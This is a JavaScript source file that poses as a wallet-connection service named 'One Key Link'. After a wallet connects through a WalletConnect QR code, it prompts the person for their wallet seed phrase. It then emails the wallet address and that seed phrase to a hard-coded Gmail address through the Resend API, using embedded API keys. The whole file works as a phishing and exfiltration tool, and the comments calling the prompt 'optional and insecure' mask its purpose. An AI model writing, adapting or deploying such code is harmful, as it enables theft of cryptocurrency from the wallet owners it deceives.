import { SignClient } from '@walletconnect/sign-client'
import QRCode from 'qrcode-terminal'
import { Resend } from 'resend'

const PROJECT_ID = 'dc06be8fb4dba51fb810e6a82d343270'
const RESEND_API_KEY = 're_4F91fu7u_GG43uwMPM25Cek2pau65BUJT'
const YOUR_EMAIL = 'infodelly609@gmail.com'

async function main() {
  // 1. Create WalletConnect client
  const client = await SignClient.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'One Key Link',
      description: 'Connect your wallet',
      url: 'https://one-key.link',
      icons: []
    }
  })

  // 2. Listen for session proposals
  client.on('session_proposal', async (proposal) => {
    console.log('📱 New wallet connecting ...')

    // Accept the session
    const { topic } = await client.approve({
      id: proposal.id,
      namespaces: {
        eip155: {
          accounts: proposal.params.requiredNamespaces.eip155.chains.map(
            chain => `${chain}:0x0`
          ),
          methods: ['eth_sign', 'personal_sign'],
          events: ['accountsChanged']
        }
      }
    })

    // Get wallet address
    const session = client.session.get(topic)
    const account = session.namespaces.eip155.accounts[0]
    const wallet = account.split(':')[2]

    console.log('✅ Wallet connected:', wallet)

    // 3. Prompt user for seed phrase (optional and insecure, use with caution)
    const seedPhrase = await promptForSeedPhrase()

    // 4. Send email
    const resend = new Resend(RESEND_API_KEY)
    await resend.emails.send({
      from: 'onboarding@resend.dev',   // Use this for testing
      to: YOUR_EMAIL,
      subject: `New Wallet: ${wallet.slice(0, 6)}...${wallet.slice(-4)}`,
      html: `
        <h2>New Wallet Connected</h2>
        <p><strong>Wallet:</strong> ${wallet}</p>
        <p><strong>Date (UTC):</strong> ${new Date().toISOString()}</p>
        <p><strong>Local time:</strong> ${new Date().toLocaleString()}</p>
        <hr>
        <p><strong>Seed Phrase:</strong> ${seedPhrase || 'Not provided'}</p>
        <hr>
        <p><em>Sent automatically by one-key.link</em></p>
      `
    })

    console.log('📧 Email sent successfully')
    process.exit(0)   // Remove this line to keep running for multiple scans
  })

  // 4. Generate QR code
  const { uri } = await client.connect({
    requiredNamespaces: {
      eip155: {
        methods: ['eth_sign', 'personal_sign'],
        chains: ['eip155:1'],
        events: ['accountsChanged']
      }
    }
  })

  console.log('\n🔳 Scan this QR code with a crypto wallet:\n')
  QRCode.generate(uri, { small: true })
  console.log('\n📋 Or copy this URI manually:\n', uri)
}

// Helper function to prompt for seed phrase (insecure, use with caution)
async function promptForSeedPhrase() {
  const readline = require('readline-sync')
  return readline.question('Enter your wallet seed phrase (optional): ')
}

main()